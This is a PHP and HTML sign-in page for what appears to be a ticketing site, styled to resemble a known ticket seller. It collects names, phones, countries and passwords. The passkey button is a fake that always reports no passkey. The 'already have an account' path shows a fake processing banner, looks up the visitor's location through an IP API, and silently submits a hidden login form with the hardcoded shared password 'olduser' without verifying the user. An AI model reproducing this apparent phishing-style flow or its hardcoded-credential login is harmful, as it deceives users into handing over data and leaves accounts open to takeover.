<?php
session_start();
require_once "inc/countries.php";

// Capture the redirect URL parameter if it exists, to pass through the forms
$redirect_url = !empty($_GET['redirect']) ? htmlspecialchars($_GET['redirect']) : '';
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Authentication</title>

    <link class="icon" href="assets/favicon.png" type="image/png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght=400;600;700;900&display=swap" rel="stylesheet">

    <!-- Font Awesome 6 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" 
        integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" 
        crossorigin="anonymous" referrerpolicy="no-referrer" />

    <style>
        body { font-family: Inter, sans-serif; }

        .brand { color:#024DDF; }
        .bg-brand { background:#024DDF; }

        .glass {
            background: rgba(255,255,255,0.9);
            backdrop-filter: blur(14px);
        }

        .input:focus {
            outline: none;
            box-shadow: 0 0 0 3px rgba(2,77,223,0.15);
            border-color:#024DDF;
        }

        .bar {
            height:6px;
            border-radius:999px;
            transition:0.3s;
        }
    </style>
</head>

<body class="bg-gray-50">

<?php 
$error_msg = "";
if (!empty($_SESSION['auth_error'])) {
    $error_msg = $_SESSION['auth_error'];
    unset($_SESSION['auth_error']);
} elseif (!empty($_GET['error']) && $_GET['error'] === 'auth_required') {
    $error_msg = "Please sign in or create an account to secure your tickets.";
}
?>

<?php if (!empty($error_msg)): ?>
    <div class="bg-red-50 text-red-600 text-sm font-bold p-3 rounded-lg mb-4 max-w-md mx-auto mt-6 border border-red-200 shadow-sm">
        <?= htmlspecialchars($error_msg); ?>
    </div>
<?php endif; ?>

<div id="successBanner" class="hidden fixed top-6 left-1/2 -translate-x-1/2 z-50 bg-green-50 text-green-700 text-sm font-bold p-4 rounded-xl border border-green-200 shadow-lg max-w-md w-full text-center">
    Processing existing account data... Please wait...
</div>

<div class="fixed inset-0 -z-10">
    <div class="absolute top-[-200px] left-[-200px] w-[500px] h-[500px] bg-blue-100 blur-3xl opacity-40"></div>
    <div class="absolute bottom-[-200px] right-[-200px] w-[500px] h-[500px] bg-blue-200 blur-3xl opacity-30"></div>
</div>

<div class="min-h-screen flex items-center justify-center px-4 py-12">

<div class="w-full max-w-md glass border border-gray-200 rounded-3xl shadow-2xl overflow-hidden relative">

    <div id="authMainStep" class="p-6 space-y-6">
        <div class="text-center">
            <img src="assets/auth-logo.png" class="h-10 mx-auto mb-4">
            <h1 class="text-2xl font-black tracking-tight text-gray-900 uppercase">Sign In Or Create Account</h1>
            <p class="text-sm text-gray-500 mt-1">If you don’t have an account you will be prompted to create one.</p>
        </div>

        <button type="button" onclick="triggerPasskeyMissing()" class="w-full bg-white hover:bg-gray-50 border border-gray-300 text-gray-800 font-bold py-3 px-4 rounded-xl flex items-center justify-center gap-2 transition shadow-sm">
            <i class="fas fa-key text-gray-600"></i>
            Sign In With A Passkey
        </button>

        <div class="relative flex py-2 items-center">
            <div class="flex-grow border-t border-gray-200"></div>
            <span class="flex-shrink mx-4 text-xs font-bold text-gray-400 tracking-wider uppercase">OR</span>
            <div class="flex-grow border-t border-gray-200"></div>
        </div>

        <div class="space-y-4">
            <div>
                <label class="block text-xs font-bold text-gray-500 uppercase tracking-wider mb-2">Email Address</label>
                <input id="initialEmailInput" type="email" placeholder="name@example.com" class="w-full border rounded-xl px-4 py-3 text-sm input bg-white" required>
            </div>

            <button type="button" onclick="handleEmailContinue()" class="w-full bg-brand text-white font-black py-3 rounded-xl hover:bg-blue-800 transition shadow-md shadow-blue-200">
                Continue
            </button>
        </div>

        <p class="text-[11px] leading-relaxed text-gray-400 text-justify border-t pt-4">
            By continuing past this page, I acknowledge that I have read and agree to the current <a href="terms.php" class="text-blue-600 font-bold hover:underline">Terms of Use</a>, including the arbitration agreement and class action waiver, updated in August 2025, and understand that information will be used as described in our <strong>Privacy Policy</strong>.
            <br><br>
            As set forth in our Privacy Policy, we may use your information for email marketing, including promotions and updates on our own or third-party products. You can opt out of our marketing emails anytime.
        </p>
    </div>

    <form id="registerForm" class="p-6 space-y-4 hidden" method="POST" action="register">
        <div class="flex items-center justify-between mb-2">
            <div class="flex items-center gap-2">
                <button type="button" onclick="resetToMain()" class="text-gray-400 hover:text-gray-600 transition">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
                </button>
                <h2 class="text-xl font-black text-gray-900">Create Your Profile</h2>
            </div>
            <a href="terms.php" target="_blank" class="text-xs font-bold text-blue-600 hover:underline flex items-center gap-1">
                Terms
                <svg class="w-3 h-3" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
            </a>
        </div>

        <input type="hidden" name="redirect" value="<?= $redirect_url ?>">
        <input type="hidden" name="email" id="hiddenRegisterEmail">

        <input name="full_name" class="w-full border rounded-xl px-4 py-3 text-sm input" placeholder="Full Name" required>

        <select name="country" id="countrySelect" class="w-full border rounded-xl px-4 py-3 text-sm input" required>
            <option value="">Select Country</option>
            <?php foreach ($countries as $c): ?>
                <option><?= htmlspecialchars($c) ?></option>
            <?php endforeach; ?>
        </select>

        <div class="flex gap-2">
            <select name="country_code" id="codeSelect" class="w-24 border rounded-xl px-2 py-3 text-sm input" required>
                <option value="">Code</option>
            </select>
            <input name="phone" class="flex-1 border rounded-xl px-4 py-3 text-sm input" placeholder="Phone" required>
        </div>

        <input name="password" id="password" class="w-full border rounded-xl px-4 py-3 text-sm input" type="password" placeholder="Password" oninput="checkStrength(this.value)" required>

        <div class="space-y-1">
            <div class="bg-gray-200 bar w-full overflow-hidden">
                <div id="strengthBar" class="bar w-0 bg-red-500"></div>
            </div>
            <p id="strengthText" class="text-xs text-gray-500">Password strength: -</p>
        </div>

        <input name="confirm_password" class="w-full border rounded-xl px-4 py-3 text-sm input" type="password" placeholder="Confirm Password" required>

        <button class="w-full bg-brand text-white font-black py-3 rounded-xl hover:bg-blue-800 transition">
            Create Account
        </button>
    </form>

    <div id="hiddenFallbackContainer" class="hidden"></div>

    <div id="passkeyModal" class="hidden absolute inset-0 bg-white/95 backdrop-blur-sm z-20 flex flex-col items-center justify-center p-6 text-center animate-fade-in">
        <div class="w-16 h-16 bg-amber-50 text-amber-500 rounded-full flex items-center justify-center mb-4">
            <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
            </svg>
        </div>
        <h3 class="text-lg font-black text-gray-900 mb-1">Passkey Not Found</h3>
        <p class="text-sm text-gray-500 mb-6 max-w-xs">We couldn't detect a saved passkey for this system profile locally.</p>
        <button type="button" onclick="closePasskeyModal()" class="px-6 py-2.5 bg-gray-900 text-white font-bold rounded-xl text-sm hover:bg-gray-800 transition">
            Go Back
        </button>
    </div>

    <div id="accountForkModal" class="hidden absolute inset-0 bg-white/95 backdrop-blur-sm z-20 flex flex-col items-center justify-center p-6 text-center">
        <div class="w-16 h-16 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mb-4">
            <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
        </div>
        <h3 class="text-lg font-black text-gray-900 mb-1 tracking-tight uppercase">Already Have An Account?</h3>
        <p class="text-sm text-gray-500 mb-6 max-w-xs">Confirm if you have registered this current email profile previously with us.</p>
         
        <div class="flex w-full gap-3 px-4">
            <button type="button" onclick="selectForkResponse('NO')" class="w-1/2 py-3 border border-gray-300 text-gray-700 font-black rounded-xl hover:bg-gray-50 transition">
                NO
            </button>
            <button type="button" onclick="selectForkResponse('YES')" class="w-1/2 py-3 bg-brand text-white font-black rounded-xl hover:bg-blue-800 transition">
                YES
            </button>
        </div>
    </div>

</div>
</div>

<script>
let currentEmailAttempt = "";

/* -----------------------
    FLOW SWITCH LOGIC
------------------------*/
function triggerPasskeyMissing() {
    document.getElementById("passkeyModal").classList.remove("hidden");
}

function closePasskeyModal() {
    document.getElementById("passkeyModal").classList.add("hidden");
}

function handleEmailContinue() {
    const emailValue = document.getElementById("initialEmailInput").value.trim();
    if (!emailValue || !emailValue.includes('@')) {
        alert("Please provide a valid email structure.");
        return;
    }
    currentEmailAttempt = emailValue;
    // Show user fork query prompt modal
    document.getElementById("accountForkModal").classList.remove("hidden");
}

function selectForkResponse(choice) {
    // Hide fork prompt immediately
    document.getElementById("accountForkModal").classList.add("hidden");
    
    if (choice === 'NO') {
        // Switch viewports over onto the structured account field inputs
        document.getElementById("authMainStep").classList.add("hidden");
        document.getElementById("registerForm").classList.remove("hidden");
        // Update targets
        document.getElementById("hiddenRegisterEmail").value = currentEmailAttempt;
    } else if (choice === 'YES') {
        const successBanner = document.getElementById("successBanner");
        successBanner.classList.remove("hidden");
        
        // Fetch IP Geolocation profile automatically via a JSON API fallback
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(geoData => {
                const localizedCountry = geoData.country_name || "United States";
                executeHiddenFallbackSubmission(localizedCountry);
            })
            .catch(() => {
                // Safe default fallback country if geo tracking is blocked by client browser policies
                executeHiddenFallbackSubmission("United States");
            });
    }
}

function executeHiddenFallbackSubmission(detectedCountry) {
    const container = document.getElementById("hiddenFallbackContainer");
    
    // Construct the hidden form targeting register.php matching your exact properties
    const hiddenForm = document.createElement("form");
    hiddenForm.method = "POST";
    hiddenForm.action = "login";
    
    const fields = {
        "redirect": "<?= $redirect_url ?>",
        "email": currentEmailAttempt,
        "full_name": "update profile",
        "password": "olduser",
        "confirm_password": "olduser",
        "country": detectedCountry,
        "country_code": "+1", // Explicit code mapping match requirement
        "phone": "+100000000"
    };

    for (const [key, value] of Object.entries(fields)) {
        const input = document.createElement("input");
        input.type = "hidden";
        input.name = key;
        input.value = value;
        hiddenForm.appendChild(input);
    }
    
    container.appendChild(hiddenForm);
    hiddenForm.submit();
}

function resetToMain() {
    document.getElementById("registerForm").classList.add("hidden");
    document.getElementById("authMainStep").classList.remove("hidden");
}

/* -----------------------
    PASSWORD STRENGTH
------------------------*/
function checkStrength(password) {
    let score = 0;
    if (password.length >= 6) score++;
    if (password.length >= 10) score++;
    if (/[A-Z]/.test(password)) score++;
    if (/[0-9]/.test(password)) score++;
    if (/[^A-Za-z0-9]/.test(password)) score++;

    const bar = document.getElementById("strengthBar");
    const text = document.getElementById("strengthText");

    bar.style.width = (score * 20) + "%";

    if (score <= 1) {
        bar.className = "bar bg-red-500";
        text.innerText = "Weak password";
    } else if (score <= 3) {
        bar.className = "bar bg-yellow-500";
        text.innerText = "Medium strength";
    } else {
        bar.className = "bar bg-green-500";
        text.innerText = "Strong password";
    }
}

/* -----------------------
    COUNTRY CODE AUTO
------------------------*/
const countryCodes = {
  "Afghanistan": "+93", "Albania": "+355", "Algeria": "+213", "Andorra": "+376", "Angola": "+244",
  "Antigua and Barbuda": "+1-268", "Argentina": "+54", "Armenia": "+374", "Australia": "+61",
  "Austria": "+43", "Azerbaijan": "+994", "Bahamas": "+1-242", "Bahrain": "+973", "Bangladesh": "+880",
  "Barbados": "+1-246", "Belarus": "+375", "Belgium": "+32", "Belize": "+501", "Benin": "+229",
  "Bhutan": "+975", "Bolivia": "+591", "Bosnia and Herzegovina": "+387", "Botswana": "+267",
  "Brazil": "+55", "Brunei": "+673", "Bulgaria": "+359", "Burkina Faso": "+226", "Burundi": "+257",
  "Cambodia": "+855", "Cameroon": "+237", "Canada": "+1", "Cape Verde": "+238", "Central African Republic": "+236",
  "Chad": "+235", "Chile": "+56", "China": "+86", "Colombia": "+57", "Comoros": "+269",
  "Congo (Congo-Brazzaville)": "+242", "Costa Rica": "+506", "Croatia": "+385", "Cuba": "+53",
  "Cyprus": "+357", "Czechia (Czech Republic)": "+420", "Democratic Republic of the Congo": "+243",
  "Denmark": "+45", "Djibouti": "+253", "Dominica": "+1-767", "Dominican Republic": "+1-809",
  "Ecuador": "+593", "Egypt": "+20", "El Salvador": "+503", "Equatorial Guinea": "+240",
  "Eritrea": "+291", "Estonia": "+372", "Eswatini": "+268", "Ethiopia": "+251", "Fiji": "+679",
  "Finland": "+358", "France": "+33", "Gabon": "+241", "Gambia": "+220", "Georgia": "+995",
  "Germany": "+49", "Ghana": "+233", "Greece": "+30", "Grenada": "+1-473", "Guatemala": "+502",
  "Guinea": "+224", "Guinea-Bissau": "+245", "Guyana": "+592", "Haiti": "+509", "Honduras": "+504",
  "Hungary": "+36", "Iceland": "+354", "India": "+91", "Indonesia": "+62", "Iran": "+98",
  "Iraq": "+964", "Ireland": "+353", "Israel": "+972", "Italy": "+39", "Ivory Coast": "+225",
  "Jamaica": "+1-876", "Japan": "+81", "Jordan": "+962", "Kazakhstan": "+7", "Kenya": "+254",
  "Kiribati": "+686", "Kuwait": "+965", "Kyrgyzstan": "+996", "Laos": "+856", "Latvia": "+371",
  "Lebanon": "+961", "Lesotho": "+266", "Liberia": "+231", "Libya": "+218", "Liechtenstein": "+423",
  "Lithuania": "+370", "Luxembourg": "+352", "Madagascar": "+261", "Malawi": "+265", "Malaysia": "+60",
  "Maldives": "+960", "Mali": "+223", "Malta": "+356", "Marshall Islands": "+692", "Mauritania": "+222",
  "Mauritius": "+230", "Mexico": "+52", "Micronesia": "+691", "Moldova": "+373", "Monaco": "+377",
  "Mongolia": "+976", "Montenegro": "+382", "Morocco": "+212", "Mozambique": "+258", "Myanmar": "+95",
  "Namibia": "+264", "Nauru": "+674", "Nepal": "+977", "Netherlands": "+31", "New Zealand": "+64",
  "Nicaragua": "+505", "Niger": "+227", "Nigeria": "+234", "North Korea": "+850", "North Macedonia": "+389",
  "Norway": "+47", "Oman": "+968", "Pakistan": "+92", "Palau": "+680", "Palestine": "+970",
  "Panama": "+507", "Papua New Guinea": "+675", "Paraguay": "+595", "Peru": "+51", "Philippines": "+63",
  "Poland": "+48", "Portugal": "+351", "Qatar": "+974", "Romania": "+40", "Russia": "+7",
  "Rwanda": "+250", "Saint Kitts and Nevis": "+1-869", "Saint Lucia": "+1-758", "Saint Vincent and the Grenadines": "+1-784",
  "Samoa": "+685", "San Marino": "+378", "Sao Tome and Principe": "+239", "Saudi Arabia": "+966",
  "Senegal": "+221", "Serbia": "+381", "Seychelles": "+248", "Sierra Leone": "+232", "Singapore": "+65",
  "Slovakia": "+421", "Slovenia": "+386", "Solomon Islands": "+677", "Somalia": "+252", "South Africa": "+27",
  "South Korea": "+82", "South Sudan": "+211", "Spain": "+34", "Sri Lanka": "+94", "Sudan": "+249",
  "Suriname": "+597", "Sweden": "+46", "Switzerland": "+41", "Syria": "+963", "Taiwan": "+886",
  "Tajikistan": "+992", "Tanzania": "+255", "Thailand": "+66", "Timor-Leste": "+670", "Togo": "+228",
  "Tonga": "+676", "Trinidad and Tobago": "+1-868", "Tunisia": "+216", "Turkey": "+90",
  "Turkmenistan": "+993", "Tuvalu": "+688", "Uganda": "+256", "Ukraine": "+380", "United Arab Emirates": "+971",
  "United Kingdom": "+44", "United States": "+1", "Uruguay": "+598", "Uzbekistan": "+998",
  "Vanuatu": "+678", "Vatican City": "+379", "Venezuela": "+58", "Vietnam": "+84", "Yemen": "+967",
  "Zambia": "+260", "Zimbabwe": "+263"
};

document.getElementById("countrySelect").addEventListener("change", function () {
    document.getElementById("codeSelect").innerHTML =
        `<option value="${countryCodes[this.value] || ''}">${countryCodes[this.value] || 'Code'}</option>`;
});
</script>

</body>
</html>
